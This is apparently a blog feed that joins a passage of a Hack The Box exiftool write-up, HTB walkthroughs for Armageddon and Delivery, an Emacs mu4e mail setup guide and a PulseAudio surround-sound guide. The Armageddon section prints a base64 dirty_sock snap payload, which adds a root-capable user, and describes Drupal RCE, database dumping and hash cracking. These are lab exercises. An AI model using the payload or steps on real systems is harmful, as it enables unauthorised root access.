  • There’s one interesting file .dbshell , we can read it .

  • Right there we got stux password and another flag.
  • Now let’s su and get the user flag.

Privilege Escalation

  • Without wasting time when i did the box i ran linpeas however it didn’t show anything interesting besides one little thing .
  • stux Is allowed to run exiftool with sudo
  • Using GTFOBINs to abuse exiftool and to overwrite files as root didn’t work. so looked more at good and found that exiftool recently had vulnerability hat allows for arbitrary code execution when parsing a malicious image.
  • We can craft a malicious image with our commands so it gets executed when its parsed with exiftool , there’s this POC which is a perl script that will generate a one image with our commands .

  • Now we just have to start a python server and upload our image to the box and execute it .

  • Now we can check if successfully managed to obtain the root flag .

  • There we go, we got the root flag.
  • Now let’s attempt to obtain a root shell, to do this i’ll generate an ssh-key and placing the key into root ssh folder .

  • And let’s check if it works .

  • And That’s Pretty Much The Box , Hope You Enjoyed Reading Take Care And i’ll see you all other time :)

item.title: How To Setup Mail In Emacs
item.description:
If you’re an emacs user and love using emacs for literally everything , then you are in the right place. In This Short Tutorial we are gonna learn how to setup Mu4e In Emacs From Scratch.

Installing Mu4e

There’s a lot of ways to install mu4e in emacs , one of the easiest ways to do it if you have doom emacs installed is to edit init.el and uncomment the mail option mu4e. the other way is to install it manually which we will cover it later on in mu installation.

Installing and mu-git and mu4e

In order to index our mail we’ll be using mu which includes mu4e for emacs. There’s few different ways to install mu which changes from distribution to another. The current stable release is 1.6.6, in case u installed 1.7.0 there’s a high chance you’ll be facing few problems and experiencing some bugs , so be sure which version you’re installing . In Arch Using AUR is pretty straight forward.

yay -S offlineimap mu-git

In Debian the stable release is 1.4.15 which is really fine really, you can use the instable repositories to install 1.6.*

apt install mu4e

In Case your distribution doesn’t have mu on their repositories you can install it from source which is really easy.

git clone -b "release/1.6" https://github.com/djcb/mu/
cd mu
meson --prefix=/usr --buildtype=plain build
ninja -C build install

Installing Isync Or OfflineImap

Both Isync And Offlineimap are great programs to download our mail into our inbox. There isn’t really that much difference, it just depends on which one you’d like to install. To Install Isync Or Offlineimap On Arch

pacman -S isync
pacman -S offlineimap

To Install Isync or Offlineimap On Debian

apt install isync
apt install offlineimap

Configuring Isync

Configuring Isync is really easy however it depends on which options you’d like to set. By default if you gonna use Gmail like myself. you’d wanna set some google options first . If you have 2FA enabled, you should first set up an app password this will let’s you control your Gmail only will a custom generated password. First head up to Set Up App Password, Select app as Mail and device as Custom and give it a name, it will generate a custom password. Disclaimer Your password should no be shared with anyone except yourself and Isync Extra As your password will be kept in Isync config file in plain text, you can avoid this and encrypt it using GPG. You can either use Pass utility if its installed on your device as a wrapper around GPG or use straight GPG. To Crypt your password using pass command.

pass insert gmail_app 
Enter password for test_gmail: *******
Retype password for test_gmail: *******

To Crypt your password using GPG command, First generate a new key if you don’t have one yet .

# This will prompt you for email and a name and a password (Use a valid real mail if you gonna share ur key will others)
# WARNING: DO NOT LOSE YOUR KEYS AND THE PASSWORD YOU USED TO CREATE THE KEYS OTHERWISE YOUR DATA WILL BE LOSE IF YOU LOSE THEM 
# ALWAYS BACKUP YOUR .gnupg AND .password-store FOLDER TO A USB_DRIVE OR AN EXTERNAL DRIVE OR IN THE CLOUD
gpg --full-generate-key
# After u create your own key, find it through the following command
gpg -K --keyid-format=long
# You'll get something like this 
# sec   rsa2048/84263A08F86B7E99 2020-06-17 [SC] [expires: 2022-06-17]
#       447FE384AAE41F357F5876FF84263A08F86B7E99
# uid                 [ultimate] Ybenel <ybenel@ybenel.cf>
# ssb   rsa2048/C8D9741AC03BE89C 2020-06-17 [E] [expires: 2022-06-17]
# Now you have your long key and ur short key, you can use whatever u want , now let's encrypt your file
echo "YOUR APP PASSWORD" > gmail_app
gpg -e -r 84263A08F86B7E99 gmail_app 
# This will create a new encrypted file called gmail_app.gpg, delete the gmail_app that contains plain text passowrd preferbly using shred

Before quickly setting up our configuration file let’s create a mail folder, to do so .

mkdir -p ~/Mail/Gmail

Now we need to create our configuration file that is located in our HOME folder which will be called ~/.mbsyncrc . And Let’s put our configurations .

IMAPAccount gmail
Host imap.gmail.com
User USERMAIL@gmail.com
PassCmd "gpg -q --for-your-eyes-only --no-tty -d ~/.password-store/gmail_app.gpg"
SSLType IMAPS
CertificateFile /etc/ssl/certs/ca-certificates.crt

IMAPStore gmail-remote
Account gmail

MaildirStore gmail-local
Subfolders Verbatim
Path ~/Mail/Gmail/
Inbox ~/Mail/Gmail/Inbox

Channel gmail
Far :gmail-remote:
Near :gmail-local:
Patterns * ![Gmail]* "[Gmail]/Sent Mail" "[Gmail]/All Mail"
Create Both
Expunge Both
SyncState *

If you use a plain text password replace PassCmd With Pass And Put your password . In Patterns This will download Sent Mail And All Mail and exclude everything else, you can add other folders as well as example , "[Gmail]/Spam" this will download the spam mail as well . Other Than GMAIL if you use another email service you can replace the above config with the correct info , and replace gmail with a custom name, as a quick example .

IMAPAccount cock 
Host mail.cock.li
User suckmycock11@cock.li
PassCmd "gpg -q --for-your-eyes-only --no-tty -d ~/.password-store/cockli.gpg"
SSLType IMAPS
CertificateFile /etc/ssl/certs/ca-certificates.crt

IMAPStore cock-remote
Account cock

MaildirStore cock-local
Subfolders Verbatim
Path ~/Mail/cock/
Inbox ~/Mail/cock/Inbox

Channel gmail
Far :gmail-remote:
Near :gmail-local:
Patterns * ![Inbox]* "[Inbox]/Sent Mail" "[Inbox]/All Mail"
Create Both
Expunge Both
SyncState *

Configuring OfflineImap

Offlineimap Configurations is no different than Isync however it does support OAUTH2 authentication mechanism which u can use or not use if u want to and what it does is just the same as App Password But With Token. Keep in mind OAUTH2 does really need more little effort if you wanna use it. Starting Off With

Setting Up GoogleApi

GoogleAPI Is required to enable GmailApi , This will allow us to read and edit mail from our gmail account, to enable simply head over google api and search for gmailapi and click enable once its enabled search for generate token and copy it to an empty file for later.

Installing gmail-oauth-tools

In order for us to use the token we got earlier we need to install and use gmail-oauth-tools this will generate a refresh token that we will use later in configuring offlineimap. To Install simply run .

git clone https://github.com/google/gmail-oauth2-tools Public/oauth2-tools

And run the following command to get your refresh token

python2 Public/oauth2-tools/python/oauth2.py --generate_oauth2_token --client_id=YOUR_CLIENT_ID --client_secret=YOUR_CLIENT_SECRET

To Get Your CLIENT-ID Head over to Here and read the steps .

Adding The Configuration Files

To Configure OfflineIMAP Put The Following Configurations In ~/.offlineimaprc

[general]
accounts = Gmail
maxsyncaccounts = 3
#pythonfile = ~/.offlineimap.py

[Account Gmail]
localrepository = Local
remoterepository = Remote

[Repository Local]
type = Maildir
localfolders = ~/Maildir
nametrans = lambda f: '[Gmail]/' + f if f in ['Drafts', 'Starred', 'Important', 'Spam', 'Trash', 'All Mail', 'Sent Mail'] else f

[Repository Remote]
type = IMAP
remotehost = imap.gmail.com
remoteuser = USERMAIL@gmail.com
auth_mechanisms = XOAUTH2
oauth2_client_id = CLIENT_ID
oauth2_client_secret = CLIENT_SECRET
oauth2_request_url = https://accounts.google.com/o/oauth2/token
oauth2_refresh_token = REFRESH_TOKEN
ssl = yes
maxconnections = 1
sslcacertfile = /etc/ssl/certs/ca-certificates.crt
ssl_version = tls1_2
folderfilter = lambda foldername: foldername in ['INBOX', 'All Mail', 'Sent Mail']
nametrans = lambda f: f.replace('[Gmail]/', '') if f.startswith('[Gmail]/') else f

Replace CLIENT-ID,CLIENT-SECRET,REFRESH-TOKEN with the tokens you’ve got. In Case Of Using GPG ENCRYPTED PASSWORD

#! /usr/bin/env python2
# In side of offlineimap.py
from subprocess import check_output

def get_pass():
    return check_output("gpg -dq ~/.password-store/gmail.gpg", shell=True).strip("\n")

# Incomment pythonfile in [general]
# Remove oauth2* settings in [Repository Remote] and add
remotepasseval = get_password()

In Case of Using Plain Text Password Or Plain Password File

# Remove oauth2* settings in [Repository Remote] 
# Add for plain text passowrd
remotepass = mypassword
# Or Password file
remotepassfile = ~/gmail_app

Getting Mail

Now Once You’ve done all the previous steps , there’s one last step to do and that is to get mail to your inbox, simply run the following command to start getting ur mail.

Offlineimap 

offlineimap

Mu 

mu init -m ~/Mail --my-address=USERMAIL@gmail.com 
mu index

And you’re finally done, you’ll now down all ur mail and it will be indexed automatically .

Setting Up mu4e in emacs

There isn’t much to do with mu4e in emacs besides adding our configurations. My configurations is the following .

(add-to-list 'load-path "/usr/share/emacs/site-lisp/mu4e")
(with-eval-after-load 'mu4e
  (setq mu4e-context-policy 'ask-if-none
        mu4e-compose-context-policy 'pick-first)
  (setq mu4e-change-filenames-when-moving t)
  ;; refresh mail using isync every 10 minutes
  (setq mu4e-update-interval (* 10 60))
  ;; Comment out mu4e-mu-binary if u have mu installed in /usr/bin/ or something
  (setq mu4e-mu-binary "~/Downloads/mu-1.6.6/mu/mu")
  (setq mu4e-get-mail-command "mbsync -a")
  (setq mu4e-root-maildir "~/Mail")
  (bind-key "C-c C-m" 'mu4e)
  (setq mu4e-html2text-command "w3m -dump -T text/html -o display_link_number=true")
  ;; (setq mu4e-html2text-command "html2markdown | grep -v '&nbsp_place_holder;'")

  (set-email-account! "Personal"
                      '((mu4e-sent-folder          . "/Gmail/[Gmail]/Sent Mail")
                        (mu4e-drafts-folder        . "/Gmail/[Gmail]/Drafts")
                        (mu4e-refile-folder        . "/Gmail/[Gmail]/All Mail")
                        (mu4e-trash-folder         . "/Gmail/[Gmail]/Trash")
                        (user-mail-address         . "USERMAIL@gmail.com")
                        (user-full-name            . "Dr Drunkenstein")
                        (mu4e-compose-signature    . "Signed By Mando")
                        (smtpmail-smtp-user        . "USERMAIL@gmail.com")
                        (smtpmail-smtp-server      . "smtp.gmail.com")
                        (smtpmail-stream-type      . ssl)
                        (smtpmail-smtp-service     . 465))
                      t)

  (setq mu4e-maildir-shortcuts
        '(("/Gmail/inbox"             . ?i)
          ("/Gmail/[Gmail]/Sent Mail" . ?s)
          ("/Gmail/[Gmail]/Trash"     . ?t)
          ("/Gmail/[Gmail]/Drafts"    . ?d)
          ("/Gmail/[Gmail]/All Mail"  . ?a))))

Extra Configurations

if you want mail notifications and modeline alert of how many mails u have unread , you’ll need an extra package called mu4e-alert. You can install it through Melpa using package-install or through use-package My Configurations for it is .

(use-package! mu4e-alert
  :after mu4e
  :config
  (setq doom-modeline-mu4e t)

  (mu4e-alert-enable-mode-line-display)
  (mu4e-alert-enable-notifications)

  (mu4e-alert-set-default-style 'libnotify)
  (map! :leader
        (:prefix ("d". "mu4e")
         :desc "Disable Mu4e Modeline Alert" "d" #'mu4e-alert-disable-mode-line-display
         :desc "Enable Mu4e Modeline Alert" "i" #'mu4e-alert-enable-mode-line-display))

  (defvar +mu4e-alert-bell-cmd '("paplay" . "/usr/share/sounds/freedesktop/stereo/message.oga")
    "Cons list with command to play a sound, and the sound file to play.
                 Disabled when set to nil.")

  (setq mu4e-alert-email-notification-types '(subjects))
  (defun +mu4e-alert-grouped-mail-notification-formatter-with-bell (mail-group _all-mails)
    "Default function to format MAIL-GROUP for notification.
                 ALL-MAILS are the all the unread emails"
    (when +mu4e-alert-bell-cmd
      (start-process (car +mu4e-alert-bell-cmd) (cdr +mu4e-alert-bell-cmd)))
    (if (> (length mail-group) 1)
        (let* ((mail-count (length mail-group))
               (first-mail (car mail-group))
               (title-prefix (format "You have %d unread emails"
                                     mail-count))
               (field-value (mu4e-alert--get-group first-mail))
               (title-suffix (format (pcase mu4e-alert-group-by
                                       (`:from "from %s:")
                                       (`:to "to %s:")
                                       (`:maildir "in %s:")
                                       (`:priority "with %s priority:")
                                       (`:flags "with %s flags:"))
                                     field-value))
               (title (format "%s %s" title-prefix title-suffix)))
          (list :title title
                :body (s-join "\n"
                              (mapcar (lambda (mail)
                                        (format "%s<b>%s</b>  %s"
                                                (cond
                                                 ((plist-get mail :in-reply-to) " ")
                                                 ((string-match-p "\\`Fwd:"
                                                                  (plist-get mail :subject)) "  ")
                                                 (t ""))
                                                (truncate-string-to-width (caar (plist-get mail :from))
                                                                          20 nil nil t)
                                                (truncate-string-to-width
                                                 (replace-regexp-in-string "\\`Re: \\|\\`Fwd: " ""
                                                                           (plist-get mail :subject))
                                                 40 nil nil t)))
                                      mail-group))))
      (let* ((new-mail (car mail-group))
             (subject (plist-get new-mail :subject))
             (sender (caar (plist-get new-mail :from))))
        (list :title sender :body subject))))
  (setq mu4e-alert-grouped-mail-notification-formatter #'+mu4e-alert-grouped-mail-notification-formatter-with-bell))

And That’s it .

Screenshot

item.title: HTB - Armageddon
item.description:
Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).

Enumeration

  • We start of with an intense full port scan with nmap.

# Nmap 7.91 scan initiated Sat Mar 27 16:47:39 2021 as: nmap -p- --min-rate 10000 -v -oN full_port.nmap 10.129.100.170
Increasing send delay for 10.129.100.170 from 0 to 5 due to 55 out of 183 dropped probes since last increase.
Warning: 10.129.100.170 giving up on port because retransmission cap hit (10).
Increasing send delay for 10.129.100.170 from 640 to 1000 due to 110 out of 366 dropped probes since last increase.
Nmap scan report for armageddon.htb (10.129.100.170)
Host is up (0.098s latency).
Not shown: 40576 closed ports, 24958 filtered ports
PORT   STATE SERVICE
80/tcp open  http
  • Then we run another nmap scan to identify what version/service ports are running on.
# Nmap 7.91 scan initiated Sat Mar 27 16:48:56 2021 as: nmap -sC -sV -p80 -oN scan.nmap 10.129.100.170
Nmap scan report for armageddon.htb (10.129.100.170)
Host is up (0.070s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
  • Nmap Identifies Port 80 To be running drupal 7 which is an old version and possibly surfring from many RCE’s Exploits .

Foothold

  • Checking Exploits that searchploit showed and from the name of the box it looks like the drupal installation is highly vulnerable to Drupalgeddon2/3 , further tho running Metasploit to launch the exploit.

  • After Few Moments.

User Enumeration

  • After Getting A foothold on the machine i tried spawning another shell to get a full tty shell ,however the following error is giving .

  • This concludes that the there’s some sort of firewall blocking it or there’s restrictions that don’t allow such outcoming connections like sandboxed programs in this case apache?.
  • However there’s an allowed connection at port 4444

  • Yet trying to spawn a tty results into another issue which confirms this a sandboxed environment .

  • Let’s get linpeas and run it, PS: Since this is a restricted environment we cannot make files executable or get them with any port unless 80.

  • Linpeas did find drupal Mysql password

  • Let’s check the full file [/var/www/html/sites/default/settings.php] for mysql username And Password.

  • Sweet , now let’s connect to mysql and dump what juicy stuff it holds .
  • Reminder, I had issues connecting to mysql directly with mysql client however i did a betterway to get the content of mysql database through mysqldump.

  • now i can just download it and cat it or import it to my own mysql server.

  • we can see that’s there’s the user brucetherealadmin which is a local user , let’s crack its hash and try to ssh with it.

  • Great it’s cracked , Now let’s try to ssh into Bruce and read the user.txt

Privilege Escalation

Initial Recon

  • After we got into user bruce let’s see if he has any sudo permissions,terms whatever .

  • Looks like he (bruce) can install snap packages , This is really interesting .

  • Let’s create a crafted snap package and install it simply it will be just a setuid binary packaged in snap that will get us root , otherway is by overwritten the content of /etc/passwd by adding a root user to it that will can ssh to …. , there’s alot of way tho.

  • There’s few exploits that were made for snapd that allowed installation of malicious crafted snaps , however we don’t need to run those exploits because this version of snap is patched and we have root privileges to install any snap package.

  • So In Order To Create a snap package i had to install an ubuntu vm cuz i’m running arch based os, so i cheated a bit and i didn’t want to run a vm so i used a prepacked snaps from those exploits link

  • i decoded the base64 and wrote it to a file using python

import base64
payload = ('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5

Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw''' + 'A' * 4256 + '==')
d = base64.b64decode(payload)
open("crafted.snap",'wb').write(d)
  • Then downloaded the file and installed it .

  • Now let’s su to the dirty_sock user we added to /etc/passwd and read the root flag.

And That’s it , that’s Armageddon hope you enjoyed the writeup take care and i’ll see you all other time.

item.title: HTB - Delivery
item.description:
Delivery Easy Box By Ippsec

Foothold

Enumeration

We start of with the nmap , nmap -sC -sV -p- -T4 -oN delivery.nmap delivery.htb We can see there’s 3 ports open.

Let’s browse http and see what’s there.

We get a static website, looking at the site source there’s nothing much there but look around contact us we get this .

We can see a note from the site owner?

For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server

so let’s look at the helpdisk at helpdesk.delivery.htb

We see osticket support center,right of the top we check for any cves but they are all old and not affective so let’s create a new account .

Now After we created an account we get account verification but thinking logically we have entered a none existing email we cannot receive emails neither do anything. Hmmm there must be somewhere around it . let’s check the open ticket thing .

let’s fill those real quick .

We Get Support ticket request created with a ticket id and an email ? At this point i was hmmmmmmmmmmmm an email , going back to the text we got earlier

Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server

Now before we go and create an account at mattermost let’s check out ticket status.

We get an confirmation error,that’s not great at this point you gotta think out of the box. what email that might exist probably everywhere . let’s submit a new ticket real quick and check again.

And We Get Another ticket_id and email address , let’s check our ticket status

And some how magically We got in as Admin .

Now let’s go back to the mattermost and create an account with our ticket email

Also we get email verification , at this point you should really use your mind for a bit . we go back to our check ticket status and we get a reply

It’s the verification code, sweet now we can verify our email address and simply login.

Now Let’s explore a bit, we click on internal and get into the channel we see there’s messages left by admin over there .

We see credentials , Swwwwwweet .let’s login via ssh .

PS: I covered the credentials so you do the box instead of copying and pasting

And There we go , now we can read the user.txt

Privilege Escalation

At This point it’s pretty straight forward , let’s run linpeas.sh and see what’s going on but there’s nothing. let’s check /opt we can see mattermost installation let’s check it .

the first thing i do , is to check the configs since they usually store credentials , and sensitive information .

Oh the config.json is interesting , let’s check it out

We can see there’s an mysql settings with some credentails , running ss -lnpt we see mysql is running . Let’s Logging And Check The database. PS: The password is a hint itself it says crack the mattermost password which is the root password

Ah there’s too many tables there , but we just interested in the Users tables.

We have the root hash it’s a bcrypt type. now before we crack it, remember from the mattermost internal channel the admin user gave us a valuable hint .

PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.

This is a usefull hint to let us know that we should generate a wordlist from hashcat rules in order to crack the root hash through “PleaseSubscribe!” Let’s go to our crackred and generate a wordlist .

that’s not a big wordlist , it should crack really fast. let’s crack our hash.

And there we goo , we’ve cracked it,took about 2 seconds , now let’s su to root.

And That’s it , that’s delivery hope you enjoyed the writeup take care and i’ll see you all other time.

item.title: Surrounded Sound In Pulse Audio
item.description:
Setting up surrounded 7.1 Sound In Pulse Audio

For many of you who are music nerds and look to enjoy music / movies / audio clips in a surrounded sound system this guide is right for you. Unfortunately if dolby supported Linux we wouldn’t all this but it’s a good practice to understand how pulse audio works and discover new ways of mixing up audio, so let’s get started !

Adding Configurations

Checking Requirements

Now before we start configuring pulse audio we need some Requirments.

  • Headset / Headphones Supports 5.1 / 7.1 Surround Sound
  • 7.1 / 5.1 Surround Sound Speaker System If your headphones / Headset / whatever you are trying doesn’t support 5.1 / 7.1 surround sound , you won’t be able to notice any change, now we gonna start by testing our headphones/speakers. speaker-test -D default -c 8 Now this will test if our device has 8 channel output (7.1) or 6 channel output (5.1), mine goes something like this .

Note: If you only see 2 output channels that means your device doesn’t support 7.1/5.1 surround sound or it set to use only 2 channel output (it comes by default with pulse audio).

Adding PulseAudio Config

Now let’s create our config file located in ~/.config/pulse/daemon.conf if pulse directory doesn’t exists just create a new one and now we will create daemon.conf and open it with some text editor and add the values below.

default-sample-format = float32le
default-sample-rate = 48000
alternate-sample-rate = 44100
default-sample-channels = 8
default-channel-map = front-left,front-right,rear-left,rear-right,front-center,lfe,side-left,side-right
default-fragments = 2
default-fragment-size-msec = 125
resample-method = soxr-vhq
enable-lfe-remixing = yes
high-priority = yes
nice-level = -11
realtime-scheduling = yes
realtime-priority = 9
rlimit-rtprio = 9
daemonize = no

understanding the config

default-sample-format

  • is sampling format it depends on the endianness of the cpu, to check your cpu byte order lscpu | grep 'Byte Order' if it’s little endian just live the config as it is , if it’s big endian replace float32le with float32be.

default-sample-rate

  • is the sample frequency , alternate-sample-rate the alternate sample frequency. Sinks and sources will use either the default-sample-rate value or this alternate value, typically 44.1 or 48kHz.

default-sample-channels

  • number of channels if you have 5.1 surround sound system change the value to (6)

default-channel-map

-the channel map if you’re on 5.1 surround sound system use this front-left,front-right,rear-left,rear-right,front-center,lfe

resample-method

  • sample rate converter best to leave it as soxr very high quality all available converters are in (man pulse-daemon.conf) , for comparison benchmarks Here

daemonize

  • daemonize after start up default is no. note don’t change the following value , the following settings prevent glitches & drop-outs during playback default-fragments hardware playback buffer subdivided into fragments default was (4)

default-fragment-size-msec

  • duration of single fragment default was (25ms) high-priority set as high priority process default to yes (Don’t change)

enable-lfe-remixing

  • if disabled upmixing or downmixing ignore lfe channel (Not Recommended To Disable)

nice-level

  • default -11, lowest value allowed: (20 - rlimit-nice), lower means more CPU-%

realtime-scheduling

  • default is yes (don’t change)

rlimit-rtprio

  • default 9, values from -20 upto 19 allowed

realtime-priority

  • default 5, highest value allowed: rlimit-rtprio, higher means more priority

Adding Alsa Config

  • Now let’s add asla config (/etc/asound.conf or ~/.asoundrc), nothing really here to explain we just using hw plugin to work with pulse audio
# Use PulseAudio plugin hw
pcm.!default {
   type plug
   slave.pcm hw
}

List Devices

  • Now let’s list our devices with (pacmd list-sinks | grep "name:") and the output should be something like this
name: <alsa_output.pci-0000_00_1b.0.analog-surround71>

note it can be more than one device depends and what you’re connecting to your workstation .

  • Now we will copy default.pa config from (/etc/pulse/default.pa to ~/.config/pulse/)

Installing Pulseaudio Modules

  • Now we need to install a quick module ladspa-bs2b and libbs2b
  In Arch Linux (AUR)
yay -S libbs2b

  In Debian / Ubuntu
apt install bs2b-ladspa

  Other Distros (Got No Idea)

Loading PulseAudio Modules

  • Now let’s load the modules, open default.pa in ~/.config/pulse and add the following lines at the bottom
# For 7.1 Surround Sound System
load-module module-remap-sink sink_name=Remape remix=yes master=alsa_output.pci-0000_00_1b.0.analog-surround71 channels=8 master_channel_map=rear-left,rear-right,front-left,front-right,front-center,lfe,side-left,side-right channel_map=front-left,front-right,rear-left,rear-right,front-center,lfe,side-left,side-right
load-module module-combine channels=8 channel_map=front-left,front-right,rear-left,rear-right,front-center,lfe,side-left,side-right
load-module module-ladspa-sink sink_name=Ybenel plugin=bs2b label=bs2b control=700,4.5

# For 5.1 Surround Sound System
load-module module-remap-sink sink_name=Remape remix=yes master=alsa_output.pci-0000_00_1b.0.analog-surround71 channels=6 master_channel_map=front-left,front-right,rear-left,rear-right,front-center,lfe channel_map=front-left,front-right,rear-left,rear-right,front-center,lfe
load-module module-combine channels=8 channel_map=front-left,front-right,rear-left,rear-right,front-center,lfe
load-module module-ladspa-sink sink_name=Ybenel plugin=bs2b label=bs2b control=700,4.5
  • There’s another module that creates a virtual surround sink but it requires a hrir file , lucky you i found a good pack that has alot of samples
  • Download the archive from Here unzip it and listem to the demos choose what you like and load the module
# This is just an example replace the hrir path and file of your like
load-module module-virtual-surround-sink hrir=/home/ybenel/Music/surround/hrir_listen/hrirs/hrir-1038.wav

Restarting PulseAudio

  • Now we need to restart pulse audio
  #Kill pulse audio
pulseaudio --kill
  #In case pulse audio didn't start
pulseaudio --start

Change Output Source

  • Now let’s open pavucontrol , if it’s not installed in your os , it’s recommended to install it .
  • In the output tab you should see the modules are loaded .
  • Go Back To The Playback Tab And You’ll see currently running apps and you’ll see the sink device that it’s been used just click it and you’ll see all available output options , choose what’s looks good in ur case.

Extra

Extra If you’re looking for some real time effects to add , you could use pulseeffects to mix , equalize , compress , whatever

  • Other Cool Thing is Audacious Player That Has Some Really Good Plugins

Conclusion

Pulse Audio Is Really not bad and It’s much less complicated than Jack Or PipeWire it only needs some configurations and little tweaking and it’s great again.
